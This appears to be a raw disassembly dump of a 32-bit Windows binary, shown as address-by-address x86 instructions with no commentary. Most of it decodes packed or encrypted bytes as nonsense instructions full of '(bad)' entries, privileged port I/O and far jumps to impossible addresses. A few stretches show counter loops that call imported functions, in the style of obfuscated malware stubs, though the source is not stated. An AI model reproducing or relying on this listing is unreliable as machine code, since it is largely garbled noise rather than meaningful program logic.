  40e561:	jge    0x40e5b8
  40e563:	inc    eax
  40e564:	xor    ch,BYTE PTR [esi+ecx*8]
  40e567:	add    BYTE PTR [ebp+0x65],ch
  40e56a:	pop    ebp
  40e56b:	in     al,0x3f
  40e56d:	addr16 fmul st,st(1)
  40e570:	sub    al,0x3f
  40e572:	mov    al,0x53
  40e574:	jge    0x40e5c2
  40e576:	clc    
  40e577:	retf   0x4f22
  40e57a:	bnd jg 0x40e5ae
  40e57d:	pop    ebx
  40e57e:	cmp    DWORD PTR [ecx-0x13db6604],eax
  40e584:	jmp    0x48b8:0xaa57396d
  40e58b:	add    ecx,ecx
  40e58d:	(bad)  
  40e58e:	mov    ds:0x50fb3131,al
  40e593:	inc    eax
  40e594:	les    edx,FWORD PTR [eax+0x0]
  40e597:	call   0xa1ea22b5
  40e59c:	push   eax
  40e59d:	test   esi,esi
  40e59f:	fdiv   QWORD PTR [edi+0x56]
  40e5a2:	adc    al,0x56
  40e5a4:	mov    ebx,0xa706741c
  40e5a9:	fnsave [edi+0x4993c13]
  40e5af:	adc    eax,0xfae435e2
  40e5b4:	push   ebp
  40e5b5:	or     eax,0x1b349b24
  40e5ba:	stos   DWORD PTR es:[edi],eax
  40e5bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e5bc:	inc    ebp
  40e5bd:	ret    
  40e5be:	sti    
  40e5bf:	push   esi
  40e5c0:	dec    ebp
  40e5c1:	push   edx
  40e5c2:	out    dx,eax
  40e5c3:	pop    ecx
  40e5c4:	jmp    0x40e5be
  40e5c6:	add    dh,bh
  40e5c8:	jle    0x40e646
  40e5ca:	cmp    BYTE PTR [ebx],cl
  40e5cc:	mov    al,ds:0x844a7405
  40e5d1:	mov    al,ds:0xd913bcb8
  40e5d6:	clc    
  40e5d7:	lahf   
  40e5d8:	and    DWORD PTR [edx],edi
  40e5da:	cmp    dh,bh
  40e5dc:	push   eax
  40e5dd:	(bad)  
  40e5de:	lock inc edx
  40e5e0:	xchg   esi,eax
  40e5e1:	mov    cl,0x3
  40e5e3:	ret    
  40e5e4:	rcl    BYTE PTR [eax-0xfbeb7ab],0x38
  40e5eb:	lock out dx,eax
  40e5ed:	shl    ebp,cl
  40e5ef:	mov    DWORD PTR [edx],ebp
  40e5f1:	dec    esp
  40e5f2:	popa   
  40e5f3:	cmp    ebp,ebx
  40e5f5:	fcom   DWORD PTR [ebp+0x4a]
  40e5f8:	cmp    bh,BYTE PTR [esi-0x1e]
  40e5fb:	repnz push ss
  40e5fd:	xlat   BYTE PTR ds:[ebx]
  40e5fe:	das    
  40e5ff:	sbb    al,0x27
  40e601:	jmp    0x9e5:0x84527ff3
  40e608:	and    dl,dl
  40e60a:	test   al,0x9
  40e60c:	pop    ebx
  40e60d:	jg     0x40e5d0
  40e60f:	inc    eax
  40e610:	popa   
  40e611:	mov    ebp,0x39baa7f9
  40e616:	test   eax,0x44cf5dcc
  40e61b:	xor    BYTE PTR [esi-0xf],0xb2
  40e61f:	xabort 0xb3
  40e622:	test   eax,0xd775c54b
  40e627:	(bad)  
  40e628:	sar    BYTE PTR [esi+0x44560b89],0x5b
  40e62f:	xor    eax,0xf3559d99
  40e634:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e635:	clc    
  40e636:	loop   0x40e678
  40e638:	sub    BYTE PTR ds:0x76824104,cl
  40e63e:	inc    edx
  40e63f:	jmp    0x35b:0x1863f162
  40e646:	xor    al,0x55
  40e648:	and    BYTE PTR [eax+0x1e],bl
  40e64b:	mov    bl,0x95
  40e64d:	mov    ?,WORD PTR [ebx-0x537e341a]
  40e653:	mov    esi,ebx
  40e655:	add    BYTE PTR [edx-0x7eb18f53],al
  40e65b:	sub    eax,0x6539c754
  40e660:	sbb    cl,BYTE PTR [esi-0x3f]
  40e663:	add    ah,BYTE PTR [edi-0x14b4e06b]
  40e669:	stc    
  40e66a:	sbb    edx,ecx
  40e66c:	sbb    BYTE PTR [edx],dh
  40e66e:	fwait
  40e66f:	(bad)  
  40e670:	fcomi  st,st(1)
  40e672:	loopne 0x40e65c
  40e674:	(bad)  
  40e676:	in     al,dx
  40e677:	inc    esp
  40e678:	jecxz  0x40e69f
  40e67a:	js     0x40e6e6
  40e67c:	sub    DWORD PTR [ebp-0x5f68ca70],eax
  40e682:	lods   eax,DWORD PTR ds:[esi]
  40e683:	(bad)  
  40e684:	cld    
  40e685:	jg     0x40e64e
  40e687:	sub    esp,DWORD PTR [edx-0x6e]
  40e68a:	push   cs
  40e68b:	outs   dx,BYTE PTR ds:[esi]
  40e68c:	rol    BYTE PTR [eax+ebp*4+0x66],1
  40e690:	mov    ebp,0x160e85f1
  40e695:	push   edx
  40e696:	retf   0x5b98
  40e699:	push   edi
  40e69a:	lahf   
  40e69b:	outs   dx,BYTE PTR ds:[esi]
  40e69c:	es push eax
  40e69e:	sbb    eax,esp
  40e6a0:	je     0x40e63b
  40e6a2:	data16 fiadd WORD PTR [edi]
  40e6a5:	pop    edx
  40e6a6:	jo     0x40e6a6
  40e6a8:	push   cs
  40e6a9:	jns    0x40e713
  40e6ab:	sub    eax,0xbe48cda3
  40e6b0:	mov    eax,ds:0xa64d529b
  40e6b5:	std    
  40e6b6:	pop    ss
  40e6b7:	pop    es
  40e6b8:	ret    0xa15a
  40e6bb:	xchg   ebp,eax
  40e6bc:	in     eax,dx
  40e6bd:	xor    BYTE PTR [edx-0x6e],bh
  40e6c0:	mov    ecx,0xf1ea4db2
  40e6c5:	lods   al,BYTE PTR ds:[esi]
  40e6c6:	push   cs
  40e6c7:	call   0xfcbf821b
  40e6cc:	mov    dl,0xbb
  40e6ce:	outs   dx,BYTE PTR ds:[esi]
  40e6cf:	fiadd  DWORD PTR [esi+0x2b]
  40e6d2:	mov    edx,0x12b3ca66
  40e6d7:	inc    ebp
  40e6d8:	mov    eax,0x7b4dca85
  40e6dd:	xchg   ecx,eax
  40e6de:	lea    ecx,[eax]
  40e6e0:	push   eax
  40e6e1:	fcmovne st,st(6)
  40e6e3:	mov    DWORD PTR [esi+0x57],edx
  40e6e6:	push   edx
  40e6e7:	out    dx,al
  40e6e8:	push   ebx
  40e6e9:	push   ebx
  40e6ea:	inc    esi
  40e6eb:	mov    eax,ds:0xde1cb2d5
  40e6f0:	cmp    DWORD PTR [edi-0x4e],ebp
  40e6f3:	adc    DWORD PTR [edx+ebx*4-0x14],edx
  40e6f7:	xor    eax,0x4244af2
  40e6fc:	mov    WORD PTR [edi+0x33],fs
  40e6ff:	mov    BYTE PTR [ebx],0xc3
  40e702:	mov    DWORD PTR [ebp+0x8],eax
  40e705:	mov    eax,ds:0x41eae6
  40e70a:	mov    DWORD PTR [ebp+0x8],eax
  40e70d:	mov    eax,DWORD PTR [ebp-0x14]
  40e710:	mov    DWORD PTR [ebp-0x4],eax
  40e713:	mov    eax,DWORD PTR [ebp-0x4]
  40e716:	push   0x4
  40e718:	pop    ecx
  40e719:	sub    ecx,eax
  40e71b:	add    ecx,DWORD PTR [ebp-0x18]
  40e71e:	mov    DWORD PTR [ebp-0x8],ecx
  40e721:	jmp    0x40e979
  40e726:	(bad)
  40e729:	(bad)  
  40e72a:	leave  
  40e72b:	fcmovbe st,st(5)
  40e72d:	sar    esp,1
  40e72f:	rcr    DWORD PTR [esp+edi*1],1
  40e732:	mov    bl,0x24
  40e734:	pop    ebx
  40e735:	mov    ?,WORD PTR [edi]
  40e737:	mov    ebx,0x7e357878
  40e73c:	js     0x40e7b6
  40e73e:	sub    ebx,DWORD PTR [eax+0x6ce1d402]
  40e744:	sahf   
  40e745:	pop    ecx
  40e746:	stos   BYTE PTR es:[edi],al
  40e747:	cld    
  40e748:	mov    bh,0x56
  40e74a:	inc    esi
  40e74b:	inc    esi
  40e74c:	iret   
  40e74d:	bound  eax,QWORD PTR [ebp-0x2f]
  40e750:	sub    esp,DWORD PTR [ebp-0x1d]
  40e753:	fidiv  DWORD PTR [edi-0x7b8bbf5]
  40e759:	xor    DWORD PTR [edx-0x73],esp
  40e75c:	add    dl,ch
  40e75e:	cld    
  40e75f:	aas    
  40e760:	repz jmp 0xd0aa9f42
  40e766:	fisub  WORD PTR [eax-0x71]
  40e769:	mov    ch,0xac
  40e76b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e76c:	sub    al,bl
  40e76e:	xchg   BYTE PTR [edx+0x12],dh
  40e771:	xchg   ecx,eax
  40e772:	xchg   edx,eax
  40e773:	dec    esi
  40e774:	mov    bl,0x92
  40e776:	mov    eax,0x51a06996
  40e77b:	push   0xf4861f8
  40e780:	push   ebx
  40e781:	pop    ds
  40e782:	cwde   
  40e783:	mov    edi,0xb811a58
  40e788:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e78a:	xor    DWORD PTR [eax+0x976bc79],0xb
  40e791:	ret    
  40e792:	pusha  
  40e793:	addr16 mov al,0xee
  40e796:	rcl    DWORD PTR ss:[edi+ebx*1],cl
  40e79a:	push   ebp
  40e79b:	pushf  
  40e79c:	sbb    edx,DWORD PTR [edi+0x78215143]
  40e7a2:	rcr    DWORD PTR [ecx],1
  40e7a4:	out    0x84,eax
  40e7a6:	dec    esp
  40e7a7:	jns    0x40e7ca
  40e7a9:	xchg   esp,eax
  40e7aa:	clc    
  40e7ab:	aas    
  40e7ac:	or     ebx,DWORD PTR [ebx+0x3f8e1f27]
  40e7b2:	push   edi
  40e7b3:	hlt    
  40e7b4:	icebp  
  40e7b5:	ins    DWORD PTR es:[edi],dx
  40e7b6:	leave  
  40e7b7:	cmp    al,0xd1
  40e7b9:	arpl   WORD PTR [ecx],bp
  40e7bb:	(bad)  
  40e7bc:	out    0x75,al
  40e7be:	repz or DWORD PTR [edi],edi
  40e7c1:	mov    dh,0x44
  40e7c3:	and    al,0x2a
  40e7c5:	cmp    eax,0x50843e9a
  40e7ca:	sub    DWORD PTR ds:0x1e68ff50,ebp
  40e7d0:	mov    edx,0xba87ef4c
  40e7d5:	cs jecxz 0x40e7e8
  40e7d8:	push   edi
  40e7d9:	retf   0xdc13
  40e7dc:	inc    ebx
  40e7dd:	xor    bl,0x98
  40e7e0:	ins    BYTE PTR es:[edi],dx
  40e7e1:	or     ecx,DWORD PTR [ebx+0x5]
  40e7e4:	fmul   QWORD PTR [ecx+0x510bcf5a]
  40e7ea:	inc    esp
  40e7eb:	in     al,dx
  40e7ec:	in     al,dx
  40e7ed:	add    ch,BYTE PTR [edi-0x30]
  40e7f0:	shl    BYTE PTR [edi-0x70],1
  40e7f3:	mov    BYTE PTR [esi],dl
  40e7f5:	mov    bl,0xf1
  40e7f7:	rol    BYTE PTR [ebx],0x5f
  40e7fa:	xor    eax,0x245de71c
  40e7ff:	fldcw  WORD PTR [eax+0x7d865d1b]
  40e805:	pop    ds
  40e806:	inc    esi
  40e807:	fst    DWORD PTR [ebx+0x557ec786]
  40e80d:	cld    
  40e80e:	js     0x40e81d
  40e810:	or     eax,edi
  40e812:	dec    edi
  40e813:	cdq    
  40e814:	inc    ecx
  40e815:	xchg   ebx,eax
  40e816:	call   0xb765:0x929fbfda
  40e81d:	jg     0x40e83e
  40e81f:	mov    ecx,0x12f029ee
  40e824:	arpl   WORD PTR [edx],si
  40e826:	xor    BYTE PTR [ebp+0x524c3b33],ch
  40e82c:	mov    ecx,0x6065cb2a
  40e831:	out    dx,al
  40e832:	pop    ss
  40e833:	inc    edx
  40e834:	cmp    DWORD PTR [edx+0x233413f1],0xffffff9e
  40e83b:	neg    DWORD PTR [edi]
  40e83d:	popf   
  40e83e:	daa    
  40e83f:	dec    ebp
  40e840:	cld    
  40e841:	lock push esi
  40e843:	mov    ds:0x27f32d20,al
  40e848:	push   eax
  40e849:	ja     0x40e8a7
  40e84b:	sub    ecx,esp
  40e84d:	gs xor eax,esi
  40e850:	adc    DWORD PTR [edi+ecx*4+0x3f0033cf],esi
  40e857:	hlt    
  40e858:	aaa    
  40e859:	les    esi,FWORD PTR [ebp+0x60dbde84]
  40e85f:	in     eax,0xb5
  40e861:	adc    bh,BYTE PTR [esi]
  40e863:	xchg   ebx,eax
  40e864:	scas   eax,DWORD PTR es:[edi]
  40e865:	sub    ebp,DWORD PTR [edx-0x2dd9462]
  40e86b:	ds dec ebp
  40e86d:	hlt    
  40e86e:	rcl    DWORD PTR [esi-0x37],0x31
  40e872:	adc    BYTE PTR [edi+0x7fe199cc],0xa7
  40e879:	std    
  40e87a:	push   esi
  40e87b:	adc    eax,0x74e40de6
  40e880:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e881:	dec    esp
  40e882:	mov    esi,0xd7a22756
  40e887:	rcr    DWORD PTR [edx+eiz*4+0x61d7e793],cl
  40e88e:	or     bl,dh
  40e890:	or     dl,BYTE PTR [esi-0x56]
  40e893:	addr16 aaa 
  40e895:	rol    BYTE PTR [edi],cl
  40e897:	and    al,0x2e
  40e899:	adc    eax,DWORD PTR [ebp-0xa9c82c]
  40e89f:	in     eax,dx
  40e8a0:	jns    0x40e845
  40e8a2:	and    dh,cl
  40e8a4:	or     BYTE PTR [ecx-0x3d8f3f4],dl
  40e8aa:	sub    BYTE PTR ds:0xbdbb006f,dh
  40e8b0:	jo     0x40e91a
  40e8b2:	fcmovnu st,st(0)
  40e8b4:	es pop edi
  40e8b7:	jb     0x40e856
  40e8b9:	sbb    DWORD PTR [eax],ebp
  40e8bb:	les    esp,FWORD PTR [ecx+0x1f288830]
  40e8c1:	loop   0x40e92a
  40e8c3:	and    cl,BYTE PTR [ebx-0x71320a62]
  40e8c9:	rcl    BYTE PTR [eax+eax*1+0x4c],1
  40e8cd:	test   ch,al
  40e8cf:	stos   DWORD PTR es:[edi],eax
  40e8d0:	rol    BYTE PTR [edx+0x352f0e48],1
  40e8d6:	sub    dl,bl
  40e8d8:	std    
  40e8d9:	(bad)  [edi-0x1e]
  40e8dc:	mov    ds:0x5631fc71,eax
  40e8e1:	sbb    BYTE PTR [esi+ecx*2],dh
  40e8e4:	in     al,dx
  40e8e5:	mov    BYTE PTR [edi-0xea09257],0x50
  40e8ec:	in     eax,0x9b
  40e8ee:	pop    ebx
  40e8ef:	sub    al,0xac
  40e8f1:	pop    ebp
  40e8f2:	adc    eax,0x98e0b66f
  40e8f7:	jl     0x40e8ff
  40e8f9:	jb     0x40e957
  40e8fb:	and    al,0xe0
  40e8fd:	sub    DWORD PTR [ecx+0x64],edi
  40e900:	ja     0x40e8cc
  40e902:	clc    
  40e903:	ret    
  40e904:	cmp    eax,0x91d47840
  40e909:	sar    BYTE PTR [esp+esi*4+0x5b9c8521],cl
  40e910:	pop    ds
  40e911:	mov    edi,0x1500fcf0
  40e916:	iret   
  40e917:	(bad)  [edi+ebx*8+0x2756aa01]
  40e91e:	push   0x69
  40e920:	and    al,0xe0
  40e922:	loopne 0x40e98e
  40e924:	retf   0xe478
  40e927:	std    
  40e928:	mov    WORD PTR [edi],fs
  40e92a:	jo     0x40e919
  40e92c:	aaa    
  40e92d:	add    bl,BYTE PTR [ebx-0x27]
  40e930:	mov    edx,0x1a2a5dc1
  40e935:	les    ecx,FWORD PTR [ebx-0x7e]
  40e938:	jmp    0xdceff707
  40e93d:	xchg   edx,eax
  40e93e:	pop    ss
  40e93f:	add    BYTE PTR [ecx],dh
  40e941:	aam    0x47
  40e943:	cmp    cl,BYTE PTR [ebx+0x17e27ebe]
  40e949:	or     BYTE PTR [ebx-0x38f54637],dl
  40e94f:	or     ch,BYTE PTR [eax-0x7a]
  40e952:	adc    eax,0x97621c72
  40e957:	xchg   ebx,eax
  40e958:	rol    BYTE PTR [ebx],cl
  40e95a:	inc    ebx
  40e95b:	pop    esi
  40e95c:	cdq    
  40e95d:	push   0x2aa7666e
  40e962:	cmc    
  40e963:	cli    
  40e964:	jbe    0x40e915
  40e966:	out    0xdc,eax
  40e968:	imul   ebp,DWORD PTR [ebp+0x70],0xac84c2c2
  40e96f:	jae    0x40e955
  40e971:	xor    esi,ebx
  40e973:	stos   DWORD PTR es:[edi],eax
  40e974:	sub    al,0x70
  40e976:	mov    esp,0x458b94bf
  40e97b:	or     al,0x33
  40e97d:	(bad)  
  40e97e:	lea    edi,[edi+eax*1+0x327298]
  40e985:	cmp    edi,0x50a
  40e98b:	jne    0x40d51f
  40e991:	mov    eax,DWORD PTR [ebp+0xc]
  40e994:	pop    edi
  40e995:	xor    eax,esi
  40e997:	pop    esi
  40e998:	add    eax,ebx
  40e99a:	pop    ebx
  40e99b:	leave  
  40e99c:	ret    0x8
  40e99f:	push   ebp
  40e9a0:	mov    ebp,esp
  40e9a2:	sub    esp,0x44
  40e9a5:	push   edi
  40e9a6:	mov    eax,DWORD PTR [ebp+0xc]
  40e9a9:	mov    DWORD PTR [ebp-0x10],eax
  40e9ac:	mov    eax,DWORD PTR [ebp+0x8]
  40e9af:	and    DWORD PTR ds:0x42a7f1,0x0
  40e9b9:	mov    edx,DWORD PTR ds:0x42a7f1
  40e9bf:	inc    edx
  40e9c0:	mov    DWORD PTR ds:0x42a7f1,edx
  40e9c6:	cmp    DWORD PTR ds:0x42a7f1,0x6
  40e9cd:	jne    0x40e9dc
  40e9d3:	push   DWORD PTR [ebp-0x28]
  40e9d6:	call   DWORD PTR ds:0x41d250
  40e9dc:	cmp    DWORD PTR ds:0x42a7f1,0x5
  40e9e3:	jne    0x40e9f6
  40e9e9:	mov    edx,DWORD PTR ds:0x42a7f1
  40e9ef:	inc    edx
  40e9f0:	mov    DWORD PTR ds:0x42a7f1,edx
  40e9f6:	cmp    DWORD PTR ds:0x42a7f1,0x10
  40e9fd:	jb     0x40e9b9
  40ea03:	mov    DWORD PTR [ebp+0x8],0xf89c8538
  40ea0a:	mov    DWORD PTR [ebp-0x20],0xf89c8539
  40ea11:	jmp    0x40ec99
  40ea16:	cmp    eax,0xd6ce3ed7
  40ea1b:	aad    0xcd
  40ea1d:	xlat   BYTE PTR ds:[ebx]
  40ea1e:	jecxz  0x40e9ce
  40ea20:	ja     0x40e9b6
  40ea22:	test   al,0x45
  40ea24:	int3   
  40ea25:	lods   al,BYTE PTR ds:[esi]
  40ea26:	hlt    
  40ea27:	mov    ecx,0x7ee57878
  40ea2c:	js     0x40eaa6
  40ea2e:	push   ds
  40ea2f:	mov    bl,0xc6
  40ea31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea32:	push   ds
  40ea33:	cmp    al,0x49
  40ea35:	mov    ebp,0xf468d014
  40ea3a:	sbb    dl,cl
  40ea3c:	iret   
  40ea3d:	retf   
  40ea3e:	retf   
  40ea3f:	push   ebp
  40ea40:	sbb    DWORD PTR [ebx+0x7],eax
  40ea43:	enter  0xbe4f,0xe6
  40ea47:	inc    ebp
  40ea48:	call   0x354a:0x7544a231
  40ea4f:	and    ebp,ebx
  40ea51:	dec    edi
  40ea52:	sub    al,0x60
  40ea54:	aaa    
  40ea55:	jmp    0xc22e:0x7376ef1b
  40ea5c:	mov    esi,0x94dbb67a
  40ea61:	aam    0xf8
  40ea63:	in     eax,dx
  40ea64:	dec    esp
  40ea65:	call   0x36a0:0x8f78ae81
  40ea6c:	fwait
  40ea6d:	push   edi
  40ea6e:	leave  
  40ea6f:	pop    esi
  40ea70:	jg     0x40ea54
  40ea72:	sbb    ebx,DWORD PTR ds:0xf6dc71e4
  40ea78:	cs int 0x9a
  40ea7b:	jle    0x40ea95
  40ea7d:	xor    ecx,DWORD PTR [edi]
  40ea7f:	in     eax,0x68
  40ea81:	popf   
  40ea82:	retf   
  40ea83:	(bad)
  40ea86:	in     eax,0x3c
  40ea88:	cmp    al,BYTE PTR [eax-0x6]
  40ea8b:	fist   DWORD PTR [ebp+0x5c9a3b4]
  40ea91:	call   0xda5d:0x3a1d2daf
  40ea98:	mov    esp,0x202153f6
  40ea9d:	push   ds
  40ea9e:	into   
  40ea9f:	mov    ds:0x62877e23,eax
  40eaa4:	test   DWORD PTR [ebp+0x61],eax
  40eaa7:	pop    ds
  40eaa8:	jb     0x40eada
  40eaaa:	mov    ebp,0x524bfae7
  40eaaf:	lds    edx,FWORD PTR [edi-0x79225373]
  40eab5:	push   ss
  40eab6:	frstor [edi+0x30]
  40eab9:	sub    eax,edx
  40eabb:	pop    edi
  40eabc:	data16 int3 
  40eabe:	lods   eax,DWORD PTR ds:[esi]
  40eabf:	in     al,dx
  40eac0:	popa   
  40eac1:	mov    ecx,0x1d96edd
  40eac6:	jb     0x40eaee
  40eac8:	add    BYTE PTR [ebx],bh
  40eaca:	aam    0xb2
  40eacc:	mov    eax,0x9e6a52e7
  40ead1:	ret    0x3a7
  40ead4:	mov    DWORD PTR [ecx],0xfcea1b95
  40eada:	ret    0xa642
  40eadd:	test   al,0x10
  40eadf:	int    0x4a
  40eae1:	rcr    cl,cl
  40eae3:	rcl    DWORD PTR [ebx+eax*2-0x61ff3457],1
  40eaea:	cld    
  40eaeb:	(bad)  
  40eaed:	or     bl,bl
  40eaef:	nop
  40eaf0:	ins    BYTE PTR es:[edi],dx
  40eaf1:	cmp    al,BYTE PTR ds:[esi+0x3c]
  40eaf5:	jo     0x40eaa6
  40eaf7:	fisttp WORD PTR [edx+0x48]
  40eafa:	in     al,0x51
  40eafc:	push   esi
  40eafd:	mov    dl,0xdf
  40eaff:	mov    al,0xc7
  40eb01:	leave  
  40eb02:	test   eax,0x23d4f452
  40eb07:	dec    edi
  40eb08:	and    ah,0xc6
  40eb0b:	mov    ebp,0x1f0b8c6f
  40eb10:	dec    ebx
  40eb11:	and    eax,0x936a7888
  40eb16:	fs sbb al,0x60
  40eb19:	(bad)  
  40eb1a:	pop    ecx
  40eb1b:	inc    ebp
  40eb1c:	adc    eax,0x95e1620e
  40eb21:	push   ss
  40eb22:	add    eax,0xfc453ff6
  40eb27:	fiadd  WORD PTR [edi+0x625adad]
  40eb2d:	cmp    bl,BYTE PTR [eax-0x1a]
  40eb30:	(bad)  
  40eb31:	push   0x6374c620
  40eb36:	mov    ebx,0x3813fca8
  40eb3b:	push   ebp
  40eb3c:	xor    edx,DWORD PTR [edi+0x74b62590]
  40eb42:	popa   
  40eb43:	scas   eax,DWORD PTR es:[edi]
  40eb44:	mov    BYTE PTR [ecx+0x3c],cl
  40eb47:	xor    al,0x3f
  40eb49:	sti    
  40eb4a:	arpl   WORD PTR [ebx+0x19],di
  40eb4d:	jae    0x40eae8
  40eb4f:	mov    ds:0x251ef7b,al
  40eb54:	aas    
  40eb55:	gs inc ebp
  40eb57:	fdiv   QWORD PTR [eax+edi*8+0x5a]
  40eb5b:	sub    eax,0x5233ac0a
  40eb60:	icebp  
  40eb61:	fld    QWORD PTR [esp+eax*2-0x4852de49]
  40eb68:	pusha  
  40eb69:	mov    esp,0xcd41b608
  40eb6e:	stc    
  40eb6f:	inc    esp
  40eb70:	std    
  40eb71:	jns    0x40eb24
  40eb73:	ss not eax
  40eb76:	inc    edx
  40eb77:	xor    eax,0x9abd6961
  40eb7c:	out    0xcd,al
  40eb7e:	jae    0x40ebdb
  40eb80:	pop    esp
  40eb81:	data16 mov cl,0x9
  40eb84:	inc    edx
  40eb85:	mov    esi,0xaac92235
  40eb8a:	data16 jge 0x40eb97
  40eb8d:	inc    esp
  40eb8e:	js     0x40ec0b
  40eb90:	or     cl,bl
  40eb92:	test   DWORD PTR [ebx+ebx*4],0xec97928b
  40eb99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eb9a:	or     al,BYTE PTR [ebp-0x52992ee2]
  40eba0:	scas   al,BYTE PTR es:[edi]
  40eba1:	cmp    al,0xb2
  40eba3:	inc    esi
  40eba4:	mov    eax,0xc761724
  40eba9:	loop   0x40eb47
  40ebab:	mov    eax,ds:0xf0aeee2b
  40ebb0:	mov    DWORD PTR [esi-0x23],ebp
  40ebb3:	mov    cl,0xc7
  40ebb5:	cmp    DWORD PTR [esi],0x6eaf8788
  40ebbb:	push   0x5a6064fa
  40ebc0:	data16 xor bl,BYTE PTR [ebx]
  40ebc3:	xor    al,0xd5
  40ebc5:	jp     0x40ebe5
  40ebc7:	push   es
  40ebc8:	add    al,0xfc
  40ebca:	dec    esi
  40ebcb:	test   al,0x2a
  40ebcd:	mov    al,ds:0x2c292a95
  40ebd2:	mov    ds:0xbc635b72,al
  40ebd7:	or     ah,cl
  40ebd9:	lods   al,BYTE PTR ds:[esi]
  40ebda:	out    0x8c,al
  40ebdc:	jl     0x40ebf2
  40ebde:	stc    
  40ebdf:	ds bswap esp
  40ebe2:	imul   esp,DWORD PTR [esi-0x3c2ec174],0xbf39089c
  40ebec:	cdq    
  40ebed:	sbb    BYTE PTR [eax+0x674888d7],bh
  40ebf3:	stos   DWORD PTR es:[edi],eax
  40ebf4:	jge    0x40ec53
  40ebf6:	sub    eax,0xb67a1425
  40ebfb:	xchg   ebx,eax
  40ebfc:	xor    DWORD PTR [di],esi
  40ebff:	adc    DWORD PTR [edx+0x3a],0x114a3ccc
  40ec06:	loope  0x40eba5
  40ec08:	push   ss
  40ec09:	mov    DWORD PTR [ebp+eax*1+0x43],edx
  40ec0d:	sbb    al,0xf3
  40ec0f:	retf   0xb80b
  40ec12:	nop
  40ec13:	mov    ch,0xec
  40ec15:	sbb    ecx,edx
  40ec17:	add    BYTE PTR [ebx+0x78d7fe39],bl
  40ec1d:	test   al,0x68
  40ec1f:	jo     0x40ec2e
  40ec21:	inc    esi
  40ec22:	lods   al,BYTE PTR ds:[esi]
  40ec23:	test   al,0x9d
  40ec25:	or     edi,DWORD PTR [eax+0x7c]
  40ec28:	sbb    al,0x41
  40ec2a:	mov    bh,0xc5
  40ec2c:	adc    DWORD PTR [ebp-0x67],ebp
  40ec2f:	js     0x40ec27
  40ec31:	dec    esi
  40ec32:	sahf   
  40ec33:	mov    edx,0x5ac66ed4
  40ec38:	sbb    eax,0xf7529199
  40ec3d:	std    
  40ec3e:	out    dx,al
  40ec3f:	add    DWORD PTR [ecx+0x174614d6],edx
  40ec45:	jnp    0x40ebcf
  40ec47:	mov    ecx,0xfa254f43
  40ec4c:	js     0x40ebd8
  40ec4e:	pop    esi
  40ec4f:	fdiv   QWORD PTR [ecx-0x3d]
  40ec52:	or     DWORD PTR [edi],0xffffff83
  40ec55:	xchg   ecx,eax
  40ec56:	xor    edx,DWORD PTR [ebx+0x4a]
  40ec59:	stos   BYTE PTR es:[edi],al
  40ec5a:	sbb    bp,si
  40ec5d:	cmc    
  40ec5e:	xchg   ecx,eax
  40ec60:	(bad)  
  40ec61:	retf   0x19c3
  40ec64:	push   0xffffff83
  40ec66:	das    
  40ec67:	mov    bh,0xe1
  40ec69:	push   es
  40ec6a:	inc    esi
  40ec6b:	fcom   DWORD PTR [edi+0x238bc08]
  40ec71:	cld    
  40ec72:	jecxz  0x40ec69
  40ec74:	inc    ecx
  40ec75:	ins    BYTE PTR es:[edi],dx
  40ec76:	sub    BYTE PTR [ebx+eiz*1],ah
  40ec79:	add    bl,BYTE PTR [esi]
  40ec7b:	loope  0x40ec4f
  40ec7d:	xchg   edi,eax
  40ec7e:	dec    esi
  40ec7f:	repnz push esi
  40ec81:	mov    esp,0x9a90acfd
  40ec86:	push   eax
  40ec87:	inc    ebp
  40ec88:	and    DWORD PTR [edi+0x7f559133],0x15be0c22
  40ec92:	add    eax,DWORD PTR [ebp+0x2de2705c]
  40ec98:	popa   
  40ec99:	mov    edx,DWORD PTR [ebp+0x8]
  40ec9c:	or     ecx,DWORD PTR ds:0x42a77d
  40eca2:	mov    DWORD PTR [ebp-0x40],eax
  40eca5:	mov    eax,0x7510850
  40ecaa:	xor    edx,eax
  40ecac:	add    edi,0x2fd0
  40ecb2:	mov    ecx,0x327298
  40ecb7:	mov    DWORD PTR ds:0x42a879,0x17
  40ecc1:	cmp    DWORD PTR ds:0x42a879,0x0
  40ecc8:	je     0x40ed80
  40ecce:	cmp    DWORD PTR ds:0x42a879,0x5
  40ecd5:	jne    0x40ecf1
  40ecdb:	push   DWORD PTR [ebp-0x1c]
  40ecde:	push   0x65c1
  40ece3:	push   DWORD PTR [ebp-0x20]
  40ece6:	push   0x6120
  40eceb:	call   DWORD PTR ds:0x41d254
  40ecf1:	cmp    DWORD PTR ds:0x42a879,0x6
  40ecf8:	jne    0x40ed0b
  40ecfe:	mov    edi,DWORD PTR ds:0x42a879
  40ed04:	dec    edi
  40ed05:	mov    DWORD PTR ds:0x42a879,edi
  40ed0b:	mov    edi,DWORD PTR ds:0x42a879
  40ed11:	dec    edi
  40ed12:	mov    DWORD PTR ds:0x42a879,edi
  40ed18:	jmp    0x40ecc1
  40ed1d:	and    DWORD PTR ds:0x42a885,0x0
  40ed27:	mov    edi,DWORD PTR ds:0x42a885
  40ed2d:	inc    edi
  40ed2e:	mov    DWORD PTR ds:0x42a885,edi
  40ed34:	cmp    DWORD PTR ds:0x42a885,0x5
  40ed3b:	jne    0x40ed53
  40ed41:	push   DWORD PTR [ebp-0xc]
  40ed44:	push   DWORD PTR [ebp-0xc]
  40ed47:	push   DWORD PTR [ebp-0x18]
  40ed4a:	push   DWORD PTR [ebp-0x14]
  40ed4d:	call   DWORD PTR ds:0x41d1a4
  40ed53:	cmp    DWORD PTR ds:0x42a885,0x4
  40ed5a:	jne    0x40ed6d
  40ed60:	mov    edi,DWORD PTR ds:0x42a885
  40ed66:	inc    edi
  40ed67:	mov    DWORD PTR ds:0x42a885,edi
  40ed6d:	cmp    DWORD PTR ds:0x42a885,0x1f
  40ed74:	jb     0x40ed27
  40ed7a:	add    edi,DWORD PTR ds:0x42a7fd
  40ed80:	add    edx,ecx
  40ed82:	mov    edi,DWORD PTR ds:0x42a7f1
  40ed88:	xor    DWORD PTR ds:0x42a875,edi
  40ed8e:	jmp    0x40f016
  40ed93:	retf   0xc5c0
  40ed96:	ror    cl,0xc5
  40ed99:	leave  
